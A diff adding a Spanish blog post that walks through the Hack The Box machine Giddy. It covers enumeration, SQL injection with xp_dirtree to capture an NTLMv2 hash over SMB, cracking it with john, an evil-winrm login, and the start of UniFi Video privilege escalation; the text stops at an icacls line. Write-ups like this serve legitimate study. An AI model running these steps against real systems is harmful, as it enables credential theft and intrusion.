@@ -1,0 +1,1137 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Giddy (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Giddy (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-04-26T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Giddy (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-04-26T00:00:00-06:00","datePublished":"2024-04-26T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Giddy (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/04/26/giddy.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Giddy (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-04-26T00:00:00-06:00" itemprop="datePublished">
+        Apr 26, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/cd0f72b791b481e72b7099668409a6a8.png" />
+</p>
+
+<ul>
+  <li>En este post vamos a resolver la maquina Giddy de la plataforma de Hack The Box donde aprovechándonos de una SQL Injection vamos a robar el hash NTLMv2 de un usuario y nos podremos conectarnos con evil-winrm ala maquina para la escalada de privilegios vamos abusar de un servicio que al correrlo podemos arrancar un .exe para hacer lo que queramos pero tendremos que hacer varios bypass al Windows Defender para conseguirlo.</li>
+</ul>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Comenzamos escaneando los puertos abiertos y servicios por el protocolo <strong>TCP</strong> de la maquina victima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,443,3389,5985 10.129.96.140 <span class="nt">-oN</span> targeted
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-04-26 12:49 CST
+Nmap scan report <span class="k">for </span>10.129.96.140
+Host is up <span class="o">(</span>0.085s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods:
+|_  Potentially risky methods: TRACE
+443/tcp  open  ssl/http      Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| tls-alpn:
+|   h2
+|_  http/1.1
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_ssl-date: 2024-04-26T18:49:52+00:00<span class="p">;</span> <span class="nt">-7s</span> from scanner time.
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>PowerShellWebAccessTestWebSite
+| Not valid before: 2018-06-16T21:28:55
+|_Not valid after:  2018-09-14T21:28:55
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: GIDDY
+|   NetBIOS_Domain_Name: GIDDY
+|   NetBIOS_Computer_Name: GIDDY
+|   DNS_Domain_Name: Giddy
+|   DNS_Computer_Name: Giddy
+|   Product_Version: 10.0.14393
+|_  System_Time: 2024-04-26T18:49:46+00:00
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>Giddy
+| Not valid before: 2024-04-25T18:44:55
+|_Not valid after:  2024-10-25T18:44:55
+|_ssl-date: 2024-04-26T18:49:53+00:00<span class="p">;</span> <span class="nt">-6s</span> from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: <span class="nt">-6s</span>, deviation: 0s, median: <span class="nt">-6s</span>
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Nos estamos enfrentando a un <strong>Windows 10</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap cme rdp 10.129.96.140
+RDP         10.129.96.140   3389   GIDDY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 or Windows Server 2016 Build 14393 <span class="o">(</span>name:GIDDY<span class="o">)</span> <span class="o">(</span>domain:Giddy<span class="o">)</span> <span class="o">(</span>nla:True<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Estas son las tecnologías que corre por detrás la pagina web.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.129</span><span class="o">.</span><span class="mf">96.140</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">IIS</span> <span class="no">Windows</span> <span class="no">Server</span><span class="p">],</span> <span class="no">X</span><span class="o">-</span><span class="no">Powered</span><span class="o">-</span><span class="no">By</span><span class="p">[</span><span class="no">ASP</span><span class="o">.</span><span class="no">NET</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Esta es la pagina web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/1.png" />
+</p>
+
+<ul>
+  <li>Si damos <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos lleva aquí.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/2.png" />
+</p>
+
+<ul>
+  <li>La razón es por que en el código fuente hay una etiqueta la cual al dar <code class="language-plaintext highlighter-rouge">click</code> en la imagen nos redirige a esa ruta.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/3.png" />
+</p>
+
+<ul>
+  <li>Vamos a hacer <code class="language-plaintext highlighter-rouge">Fuzzing</code> para ver si encontramos rutas interesantes.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.129.96.140 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 80 <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.6
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.129.96.140
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 80
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.6
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fremote]
+/<span class="k">*</span>checkout<span class="k">*</span>           <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>docroot<span class="k">*</span>            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>                    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/mvc                  <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 148] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.129.96.140/mvc/]
+/http%3A%2F%2Fwww     <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/q%26a                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">**</span>http%3a            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>http%3A             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">**</span>http%3A            <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fyoutube <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fblogs   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fblog    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/Remote               <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 157] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> /Remote/default.aspx?ReturnUrl<span class="o">=</span>%2fRemote]
+/<span class="k">**</span>http%3A%2F%2Fwww   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/s%26p                <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/%3FRID%3D2671        <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/devinmoore<span class="k">*</span>          <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/200109<span class="k">*</span>              <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>sa_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/<span class="k">*</span>dc_                 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fcommunity <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fradar   <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/q%26a2               <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/login%3f             <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/Shakira%20Oral%20Fixation%201%20%26%202 <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fjeremiahgrossman <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fweblog  <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+/http%3A%2F%2Fswik    <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 3420]
+Progress: 220546 / 220547 <span class="o">(</span>100.00%<span class="o">)</span>
+<span class="o">===============================================================</span>
+Finished
+<span class="o">===============================================================</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Bueno si nos vamos a la parte de <code class="language-plaintext highlighter-rouge">Remote</code> encontramos esto pero no tenemos credenciales.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/4.png" />
+</p>
+
+<ul>
+  <li>Si vamos ala ruta <code class="language-plaintext highlighter-rouge">mvc</code> nada interesante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/5.png" />
+</p>
+
+<h2 id="sql-injection">SQL Injection</h2>
+
+<ul>
+  <li>Si selecciono un producto la <strong>URL</strong> ya es interesante.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/6.png" />
+</p>
+
+<ul>
+  <li>Si pongo una <code class="language-plaintext highlighter-rouge">'</code> después de <code class="language-plaintext highlighter-rouge">id=28</code>  nos devuelve un error además de que vemos un usuario <code class="language-plaintext highlighter-rouge">jnogueira</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/7.png" />
+</p>
+
+<ul>
+  <li>
+    <p>Estamos ante una maquina Windows a si que lo que podemos hacer es jugar con el <code class="language-plaintext highlighter-rouge">xp_dirtree</code> sabiendo que corre <code class="language-plaintext highlighter-rouge">mysql</code> por detrás <a href="https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server">https://stackoverflow.com/questions/26750054/xp-dirtree-in-sql-server</a>.</p>
+  </li>
+  <li>
+    <p>Si vemos el recurso vemos que comparten una <code class="language-plaintext highlighter-rouge">query</code> que al parecer se esta usando para robar el hash NTLMv2 de algún usuario ya que se conecta algún recurso compartido podemos nosotros compartir uno para intentarlo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Pero nada.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/8.png" />
+</p>
+
+<ul>
+  <li>Si revisamos el error nos dice <code class="language-plaintext highlighter-rouge">Incorrect syntar near '</code> así que vamos a probar quitándole la <code class="language-plaintext highlighter-rouge">'</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/9.png" />
+</p>
+
+<ul>
+  <li>Y funciona nos llega el hash del usuario <code class="language-plaintext highlighter-rouge">Stacy</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:fd090e689929af2ccc006414acc9091c:01010000000000000050ab281298da0166fd32f6cb3311030000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f004700740061004100070008000050ab281298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>GIDDY<span class="se">\S</span>tacy,GIDDY<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User GIDDY<span class="se">\S</span>tacy authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stacy::GIDDY:aaaaaaaaaaaaaaaa:2d920fc42f14ee67db3416f7bfb13486:010100000000000080e643291298da01927a3a66ded6d3fe0000000001001000650050005200740050004500440068000300100065005000520074005000450044006800020010006f006a0065006f004700740061004100040010006f006a0065006f0047007400610041000700080080e643291298da0106000400020000000800300030000000000000000000000000300000670f571a29eefa618339fbbf9271e7c33d87cc2100fa14d9046c67efb0dcd8ce0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e00320031003600000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>2:smbFolder<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.96.140,49709<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
+</code></pre></div></div>
+
+<h2 id="stacy">Stacy</h2>
+
+<ul>
+  <li>Vamos a crackear el hash.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+xNnWo6272k7x     <span class="o">(</span>Stacy<span class="o">)</span>
+1g 0:00:00:16 DONE <span class="o">(</span>2024-04-26 13:47<span class="o">)</span> 0.05899g/s 158644p/s 158644c/s 158644C/s xabat..x9831915x
+Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+
+<ul>
+  <li>El usuario <code class="language-plaintext highlighter-rouge">Stacy</code> forma parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content cme winrm 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>
+SMB         10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> None <span class="o">(</span>name:10.129.96.140<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
+HTTP        10.129.96.140   5985   NONE             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.129.96.140:5985/wsman
+WINRM       10.129.96.140   5985   NONE             <span class="o">[</span>+] None<span class="se">\s</span>tacy:xNnWo6272k7x <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora ya podemos conectarnos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.129.96.140 <span class="nt">-u</span> <span class="s1">'stacy'</span> <span class="nt">-p</span> <span class="s1">'xNnWo6272k7x'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
+</span>giddy<span class="se">\s</span>tacy
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos la primera flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
+e7d6583b3852e4219ee8c8e1b83aa588
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Si recordamos tenemos Un <code class="language-plaintext highlighter-rouge">Windows PowerShell Web Access</code> así que podemos conectarnos por allí también.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/12.png" />
+</p>
+
+<ul>
+  <li>Pero básicamente es lo mismo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/13.png" />
+</p>
+
+<ul>
+  <li>Encontramos un archivo interesante.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\S</span>tacy<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>        6/17/2018   9:36 AM              6 unifivideo
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/giddy/14.png" />
+</p>
+
+<ul>
+  <li>Tiene vulnerabilidades.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content searchsploit unifi video
+<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                        |  Path
+<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
+Ubiquiti Networks UniFi Video Default | php/webapps/39268.java
+Ubiquiti UniFi Video 3.7.3 - Local Pr | windows/local/43390.txt
+<span class="nt">--------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<ul>
+  <li>Si examinamos el <code class="language-plaintext highlighter-rouge">windows/local/43490.txt</code> nos dice donde esta instalado.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>5. VULNERABILITY DETAILS
+<span class="o">========================</span>
+Ubiquiti UniFi Video <span class="k">for </span>Windows is installed to <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-v
+ideo</span><span class="se">\"</span><span class="s2">
+by default and is also shipped with a service called "</span>Ubiquiti UniFi Vid
+eo<span class="s2">". Its
+executable "</span>avService.exe<span class="s2">" is placed in the same directory and also runs
+ under
+the NT AUTHORITY/SYSTEM account.
+</span></code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\P</span>rogramData<span class="se">\u</span>nifi-video
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+d-----        6/16/2018   9:54 PM                bin
+d-----        6/16/2018   9:55 PM                conf
+d-----        6/16/2018  10:56 PM                data
+d-----        6/16/2018   9:54 PM                email
+d-----        6/16/2018   9:54 PM                fw
+d-----        6/16/2018   9:54 PM                lib
+d-----        4/26/2024   2:48 PM                logs
+d-----        6/16/2018   9:55 PM                webapps
+d-----        6/16/2018   9:55 PM                work
+<span class="nt">-a----</span>        7/26/2017   6:10 PM         219136 avService.exe
+<span class="nt">-a----</span>        6/17/2018  11:23 AM          31685 hs_err_pid1992.log
+<span class="nt">-a----</span>        8/16/2018   7:48 PM         270597 hs_err_pid2036.mdmp
+<span class="nt">-a----</span>        6/16/2018   9:54 PM            780 Ubiquiti UniFi Video.lnk
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          48640 UniFiVideo.exe
+<span class="nt">-a----</span>        7/26/2017   6:10 PM          32038 UniFiVideo.ico
+<span class="nt">-a----</span>        6/16/2018   9:54 PM          89050 Uninstall.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Además nos dicen que tenemos capacidad de escritura.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>However the default permissions on the <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData</span><span class="se">\u</span><span class="s2">nifi-video"</span> <span class="nb">fold
+</span>er are
+inherited from <span class="s2">"C:</span><span class="se">\P</span><span class="s2">rogramData"</span> and are not explicitly overridden, which
+ allows
+all <span class="nb">users</span>, even unprivileged ones, to append and write files to the appl
+ication
+directory:
+
+c:<span class="se">\P</span>rogramData&gt;icacls unifi-video
